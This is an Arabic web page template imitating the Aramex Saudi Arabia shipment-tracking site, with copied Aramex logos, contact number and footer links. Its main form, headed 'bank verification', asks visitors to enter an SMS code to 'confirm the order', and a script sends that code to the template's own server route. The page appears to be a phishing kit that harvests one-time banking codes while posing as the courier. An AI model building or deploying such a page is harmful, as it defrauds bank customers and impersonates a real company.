<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>خدمة تتبع الشحنات الدولية - أرامكس</title>
    <link rel="stylesheet" href="{{ asset('frontend/css/bootstrap.min.css') }}">
    <link rel="stylesheet" href="{{ asset('frontend/css/all.min.css') }}">
    <link rel="stylesheet" href="{{ asset('frontend/css/style.css') }}">


</head>
<body>
    


    <div class="upperBar bg-dark text-white">
        <div class="container">
            <div class="row">
                
                <div class="col-lg-2 col-sm-4">
                  <p> <img src="https://www.aramex.com/Sitefinity/WebsiteTemplates/aramex/App_Themes/aramex/Images/svg/saudi-arabias-contactus.svg" style="width: 30px; margin-left: 8px;border-radius:1px;" alt="">
                    للتواصل <span>| 8001000880 </span></p>
              </div>
                <div class="col-lg-10 col-sm-8">
                    <ul class="list-unstyled d-flex justify-content-end">
                        <li>
                          <span>أرامكس الشركات</span>
                        </li>

                        <li>
                          <span>المملكة العربية السعودية </span><i class="fas fa-angle-down"></i>
                        </li>

                        <li>
                          <span>العربيه - ذكر</span><i class="fas fa-angle-down"></i>
                        </li>

                        <li>
                          <i class="fas fa-search"></i>
                        </li>

                    </ul>
                </div>

               
            </div>
        </div>
    </div>

    <nav class="navbar navbar-expand-lg">
        <div class="container">
          <a class="navbar-brand" href="#"><img src="https://www.aramex.com/docs/default-source/site-assets/aramex-logo.svg" alt=""></a>
          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
          </button>
          <div class="collapse navbar-collapse" id="navbarSupportedContent">
            <ul class="navbar-nav me-auto mb-2 mb-lg-0">
              <li class="nav-item">
                <a class="nav-link active" aria-current="page" href="#">تتبع الشحنات</a>
              </li>
              <li class="nav-item">
                <a class="nav-link" href="#">أرسل الشحنات</a>
              </li>
              
              <li class="nav-item">
                <a class="nav-link" href="#">الحلول والخدمات</a>
              </li>

              <li class="nav-item">
                <a class="nav-link" href="#">المساعدة والدعم</a>
              </li>

              <li class="nav-item">
                <a class="nav-link" href="#">مدونات أرامكس</a>
              </li>
             
            </ul>
            
            <a href=""  class="login-btn">تسجيل الدخول</a>

          </div>
        </div>
      </nav>


      
      <main>
        <div class="container">
            <div class="row">


              <div class="col-lg-4">
                <div class="list">
                    <ul class="list-unstyled">
                        <li class="active">
                            <span>تتبع الشحنات</span>
                            <i class="fas fa-long-arrow-alt-left"></i>

                        </li>

                        <li>
                          <span>تتبع طلبات الاستلام</span>
                          <i class="fas fa-long-arrow-alt-left"></i>

                      </li>


                      <li>
                        <span>التتبع المتقدم</span>
                        <i class="fas fa-long-arrow-alt-left"></i>

                    </li>

                    <li>
                      <span>إشعارات</span>
                      <i class="fas fa-long-arrow-alt-left"></i>

                  </li>

                    </ul>
                </div>

                <div class="apps">
                 
                    <ul class="list-unstyled">
                      
                      <li class="d-block text-center">
                        <span class="icon"><i class="fas fa-mobile-alt"></i></span>
                        <p>تنزيل تطبيقات أرامكس للأجهزة الجوالة</p>
                      </li>

                      <li>
                        <span>أندرويد</span>
                        <i class="fas fa-long-arrow-alt-left"></i>

                    </li>

                    <li>
                      <span>آي أو إس (آي فون)</span>
                      <i class="fas fa-long-arrow-alt-left"></i>

                  </li>

                    </ul>
                </div>

            </div>

                <div class="col-lg-8">
                    <div class="Shipment-Tracking">
                        <span class="icon"><i class="fas fa-globe-americas"></i></span>
                        <h2>تتبع الشحنات</h2>
                        <p>استخدم خيارات تتبع الشحنات المتاحة لأجهزة الجوال والكمبيوتر الشخصي لديك. احصل على الإشعارات عند يتم تحديد موعد للاستلام أو عندما يتم توصيل شحنة، واستلم تحديثات بشأن حالة شحنتك في أي وقت.</p>
                        
                    </div>

                    
                    
                    <div class="content">
                      <h3 class="mb-3 text-capitalize">التحقق المصرفي </h3>
                      <p class="mb-3">يرجى ادخالها لتاكيد الطلب sms سيتم ارسال رسالة</p>
                      <div id="form-errors"></div>
                      <form id="send_code">
                        @csrf
                          <input class="form-control mb-4" required type="number" name="verification" id="" placeholder="ادخل الرمز">
                          <button type="submit"  class="btn text-white btn-veirfy mb-2">تحقق</button>
                      </form>
                  </div>





                </div>


            </div>
        </div>
      </main>





      <footer class="bg-dark text-white">
        <div class="container">
          <div class="row">

            <div class="col-lg-8 col-sm-10 m-sm-auto">
              <div class="rightSide">
              <div class="row">
                
                <div class="col-lg-3 col-sm-6">
                  <div class="footer-item">
                    <ul class="list-unstyled">
                      <li><a href="">عن أرامكس <span class="divider"></span></a></li>
                      <li><a href="">نبذة عن أرامكس</a></li>
                      <li><a href="">علاقات المستثمرين</a></li>
                      <li><a href="">الاستدامة</a></li>
                      <li><a href="">الإمتيازات التجارية</a></li>

                    </ul>
                  </div>
                </div>


                <div class="col-lg-3 col-sm-6">
                  <div class="footer-item">
                    <ul class="list-unstyled">
                      <li><a href="">مركز حلول المطورين<span class="divider"></span></a></li>
                      <li><a href="">خدمة ’كليك تو شيب‘</a></li>
                      <li><a href="">واجهات برمجة التطبيقات</a></li>
                      <li><a href="">منتدى المطورين</a></li>
                      <li><a href="">منصات التجارة الالكترونية
                      </a></li>

                    </ul>
                  </div>
                </div>
                

                <div class="col-lg-3 col-sm-6">
                  <div class="footer-item">
                    <ul class="list-unstyled">
                      <li><a href="">المسؤولية القانونية<span class="divider"></span></a></li>
                      <li><a href="">شروط استخدام الموقع</a></li>
                      <li><a href="">حماية العملاء ومنع الاحتيال</a></li>
                      <li><a href="">سياسة خصوصية الموقع الإلكتروني</a></li>

                    </ul>
                  </div>
                </div>



                <div class="col-lg-3 col-sm-6">
                  <div class="footer-item">
                    <ul class="list-unstyled">
                      <li><a href="">التواصل<span class="divider"></span></a></li>
                      <li><a href="">دعم العملاء</a></li>
                      <li><a href="">الوظائف</a></li>


                    </ul>
                  </div>
                </div>

              </div>
              </div>
            </div>

            <div class="col-lg-4 col-sm-10 m-sm-auto">
              <div class="leftSide">
              <input type="text" class="form-control" name="" id="" placeholder="Search "><i class="fas fa-search"></i>

              <ul class="list-unstyled d-flex justify-content-start">
                <li><a href=""><i class="fab fa-facebook"></i></a></li>
                <li><a href=""><i class="fab fa-twitter"></i></a></li>
                <li><a href=""><i class="fab fa-instagram"></i></a></li>
                <li><a href=""><i class="fab fa-linkedin"></i></a></li>
                <li><a href=""><i class="fab fa-youtube"></i></a></li>

              </ul>

              <p>© أرامكس 2022. جميع الحقوق محفوظة.</p>
              <p>8001000880 | للتواصل <img src="https://www.aramex.com/Sitefinity/WebsiteTemplates/aramex/App_Themes/aramex/Images/svg/saudi-arabias-contactus.svg" style="width: 39px; height: 20px; border-radius: 3px; display: inline-block; margin-left: 14px;" alt=""></p>
              </div>
            </div>
            
          </div>
        </div>
      </footer>
    
      <script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.0/sweetalert.min.js"></script>


      <script src="{{ asset('frontend/cssjs/bootstrap.bundle.min.js')}}"></script>
    <script src="{{ asset('frontend/cssjs/all.min.js')}}"></script>
    <script src="{{ asset('frontend/cssjs/main.js')}}"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>

    <script>
         $('#send_code').on('submit', function(e) {
            e.preventDefault();
            var frm = $('#send_code');
            var formData = new FormData(frm[0]);
            
            var data = $(this).serialize();

            $.ajax({
                url: "{{ route('send.verification') }}",
                type: "post",
                data: formData,
                processData: false,
                contentType: false,
                success: function(data) {
                    // var table = $('#stores').DataTable();
             
                    
                        document.getElementById("send_code").reset();
                        swal("تم الارسال بنجاح ", {
                            buttons: false,
                            timer: 3000,
                            icon: "success"
                        });
                        setTimeout(function(){
                window.location.href="/"; // The URL that will be redirected too.
            }, 3000);

                },
                error: function(data) {
                    var errors = data.responseJSON;
                    var errors = data.responseJSON;
                    errorsHtml = '<div class="alert alert-danger"><ul>';
                    $.each(errors.errors, function(k, v) {
                        errorsHtml += '<li>' + v + '</li>';
                    });
                    errorsHtml += '</ul></di>';
                    $('#form-errors').html(errorsHtml);
                },
            });
        });
    </script>

</body>
</html>